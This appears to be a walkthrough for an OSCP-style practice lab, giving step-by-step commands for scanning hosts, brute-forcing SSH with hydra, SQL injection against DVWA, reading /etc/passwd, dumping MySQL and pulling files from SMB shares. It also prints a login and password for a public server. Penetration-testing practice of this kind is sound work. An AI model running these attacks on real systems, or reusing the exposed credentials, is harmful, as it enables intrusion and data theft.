# 🎯 Real Commands to Run in Your OSCP Lab

## Step 1: Connect and Enter Your Container

```bash
# From your local machine
ssh oscpuser2@155.138.197.128
# Password: OscpLab2!2024

# Start your lab
./start-lab.sh
# You're now in kali-user2 container
```

## Step 2: Install Tools (REQUIRED FIRST!)

```bash
# Update package lists
apt update

# Install all tools at once (copy this entire line)
apt install -y nmap netcat-traditional curl wget git net-tools iputils-ping dnsutils gobuster nikto enum4linux smbclient hydra sqlmap ftp telnet mysql-client redis-tools python3 python3-pip -q
```

## Step 3: Network Discovery (REAL SCANS)

```bash
# Check your IP
ip addr show eth0
# You should be 172.16.0.12

# Discover all hosts
nmap -sn 172.16.0.0/24
# You'll see 14 hosts up
```

## Step 4: Port Scanning (REAL)

```bash
# Quick scan of all targets
nmap -p- --min-rate=1000 172.16.0.20-110

# Detailed scan of specific targets
nmap -sV -sC 172.16.0.20   # SSH server
nmap -sV -sC 172.16.0.30   # DVWA
nmap -sV -sC 172.16.0.40   # FTP
nmap -sV -sC 172.16.0.50   # MySQL
nmap -sV -sC 172.16.0.60   # SMB
```

## Step 5: Service Enumeration (REAL CONNECTIONS)

### FTP - Anonymous Access
```bash
# Connect to FTP
ftp 172.16.0.40
# Username: anonymous
# Password: anonymous
# Commands: ls, quit
```

### SMB - List Shares
```bash
# List SMB shares
smbclient -L //172.16.0.60 -N

# Connect to public share
smbclient //172.16.0.60/public -N
# Commands: ls, get credentials.txt, exit
```

### Web - Check DVWA
```bash
# Check web server
curl http://172.16.0.30

# Look for login
curl http://172.16.0.30/login.php
```

### MySQL - Connect
```bash
# Connect to MySQL
mysql -h 172.16.0.50 -u root -ppassword123

# Once connected:
SHOW DATABASES;
USE company;
SELECT * FROM users;
exit
```

### Redis - Test Connection
```bash
# Test Redis
redis-cli -h 172.16.0.80 -a redis123 ping
# Should return PONG

# Get info
redis-cli -h 172.16.0.80 -a redis123 INFO server
```

## Step 6: Exploitation (REAL ATTACKS)

### SSH Brute Force
```bash
# Create password file
echo -e "toor\nadmin\npassword\nroot" > passwords.txt

# Brute force SSH
hydra -l root -P passwords.txt ssh://172.16.0.20 -t 4
# Will find: root:toor

# Connect with found password
ssh root@172.16.0.20
# Password: toor
# Run: id, whoami, exit
```

### DVWA SQL Injection
```bash
# Login to DVWA first
curl -c cookies.txt -X POST http://172.16.0.30/login.php \
  -d "username=admin&password=password&Login=Login"

# Test SQL injection
curl -b cookies.txt "http://172.16.0.30/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit"
```

### Directory Enumeration
```bash
# Find hidden directories
gobuster dir -u http://172.16.0.30 -w /usr/share/wordlists/dirb/common.txt
```

## Step 7: Post-Exploitation

### On SSH Server (after login with root:toor)
```bash
ssh root@172.16.0.20
# Password: toor

# Look around
cat /etc/passwd
ls /home/
find / -perm -u=s -type f 2>/dev/null
exit
```

### Extract SMB Files
```bash
# Download all files from SMB
smbget -R smb://172.16.0.60/public -U guest%
# or
smbclient //172.16.0.60/public -N -c "prompt OFF; recurse ON; mget *"
```

## Step 8: Vulnerability Scanning

```bash
# Scan for vulnerabilities
nmap --script vuln 172.16.0.30
nmap --script vuln 172.16.0.20
```

## Step 9: Web Application Scanning

```bash
# Scan DVWA
nikto -h http://172.16.0.30

# If you have OWASP ZAP or Burp installed
# You can proxy through them for more testing
```

## Step 10: Create Report

```bash
# Save all your findings
mkdir ~/evidence
nmap -sV -sC 172.16.0.20-110 -oN ~/evidence/full-scan.txt
echo "Credentials Found:" > ~/evidence/creds.txt
echo "root:toor (SSH 172.16.0.20)" >> ~/evidence/creds.txt
echo "admin:password (DVWA 172.16.0.30)" >> ~/evidence/creds.txt
echo "root:password123 (MySQL 172.16.0.50)" >> ~/evidence/creds.txt
```

---

## 🔥 Quick Win Commands (Copy & Paste)

### Get a quick shell on SSH server:
```bash
sshpass -p toor ssh root@172.16.0.20
```

### Quick MySQL dump:
```bash
mysqldump -h 172.16.0.50 -u root -ppassword123 --all-databases > mysql_dump.sql
```

### Quick SMB file grab:
```bash
smbclient //172.16.0.60/public -N -c "get credentials.txt"
```

### Quick Redis check:
```bash
redis-cli -h 172.16.0.80 -a redis123 CONFIG GET dir
```

---

## ⚠️ Common Issues & Fixes

### "Command not found"
```bash
# Install the missing tool
apt update && apt install -y [tool-name]
```

### Can't reach targets
```bash
# Check your IP
ip addr show
# Should be 172.16.0.1X

# Ping test
ping 172.16.0.20
```

### Slow scans
```bash
# Use faster scan options
nmap -T4 --min-rate=1000 [target]
```

---

## 📊 Expected Results

When everything works correctly, you should:
- Find 14 live hosts
- Access SSH with root:toor
- Login to DVWA with admin:password
- Connect to MySQL with root:password123
- Download files from SMB share
- Connect to Redis with password redis123
- Find multiple vulnerabilities

This is REAL penetration testing practice!